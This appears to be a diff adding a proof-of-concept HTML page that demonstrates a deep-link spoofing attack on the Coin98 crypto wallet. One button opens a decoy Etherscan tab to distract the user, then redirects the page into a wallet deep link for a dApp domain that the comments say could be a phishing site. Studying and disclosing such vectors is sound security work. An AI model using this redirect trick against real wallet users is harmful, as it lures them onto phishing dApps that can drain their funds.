@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Coin98 Deep Link Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h2>Deep Link Attack Demo</h2>
+  <p>This demo will simulate a malicious deep link.</p>
+  <button onclick="launchSpoof()">Launch Fake DApp</button>
+
+  <script>
+    function launchSpoof() {
+      // 1. Open a decoy site in a new tab (to distract the user)
+      window.open("https://etherscan.io", "_blank");  // Decoy: opens Etherscan
+
+      // 2. Craft the Coin98 deep link URL for the target DApp and network
+      const dappURL = "uniswap.com";   // target DApp domain (could be a phish site)
+      const chainId = 1;              // Ethereum mainnet chain ID
+      const deepLink = `https://coin98.com/dapp/${dappURL}/${chainId}`;
+
+      // 3. Redirect the current window to the Coin98 deep link
+      window.location.href = deepLink;
+    }
+  </script>
+</body>
+</html>
